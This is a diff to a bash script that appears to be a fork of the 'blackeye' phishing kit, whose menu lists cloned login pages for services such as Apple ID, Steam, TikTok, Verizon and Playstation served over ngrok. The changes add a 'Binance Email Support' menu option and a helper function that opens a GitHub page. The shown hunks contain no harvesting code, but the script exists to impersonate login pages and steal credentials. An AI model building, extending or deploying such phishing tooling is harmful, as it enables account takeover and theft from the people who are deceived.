@@ -1,5 +1,16 @@
 #!/bin/bash
 
+open_page() {
+    url="https://github.com/EricksonAtHome/bes"
+     open "$url"
+}
+
+start_server() {
+    server=$1
+    # Start de server
+    echo "Start de server voor: $server"
+}
+
 # Upgraded by: @EricksonAtHome (https://github.com/EricksonAtHome/blackeye)
 #Enhanced ngrok tunnelling
 trap 'printf "\n";stop;exit 1' 2
@@ -21,6 +32,7 @@ printf "          \e[1;92m[\e[0m\e[1;77m13\e[0m\e[1;92m]\e[0m\e[1;91m IGFollower
 printf "          \e[1;92m[\e[0m\e[1;77m14\e[0m\e[1;92m]\e[0m\e[1;91m Pinterest\e[0m      \e[1;92m[\e[0m\e[1;77m30\e[0m\e[1;92m]\e[0m\e[1;91m Steam  \e[0m                              \n"
 printf "          \e[1;92m[\e[0m\e[1;77m15\e[0m\e[1;92m]\e[0m\e[1;91m Apple ID\e[0m       \e[1;92m[\e[0m\e[1;77m31\e[0m\e[1;92m]\e[0m\e[1;91m Tiktok \e[0m                             \n"
 printf "          \e[1;92m[\e[0m\e[1;77m16\e[0m\e[1;92m]\e[0m\e[1;91m Verizon\e[0m        \e[1;92m[\e[0m\e[1;77m32\e[0m\e[1;92m]\e[0m\e[1;91m Playstation  \e[0m           \e[1;94m                  \n"
+printf "          \e[1;92m[\e[0m\e[1;77m41\e[0m\e[1;92m]\e[0m\e[1;91m Binance Email Support \e[0m       \e[1;94m             \n"
 
 
 read -p $'\n\e[1;92m\e[0m\e[1;77m\e[0m\e[1;92m ┌─[ Choose an option:]─[~]
@@ -184,6 +196,10 @@ elif [[ $option == 40 ]]; then
 server="create"
 createpage
 start
+
+elif [[ $option == 41 ]]; then
+    open_page
+
 
 else
 printf "\e[1;93m [!] Invalid option!\e[0m\n"
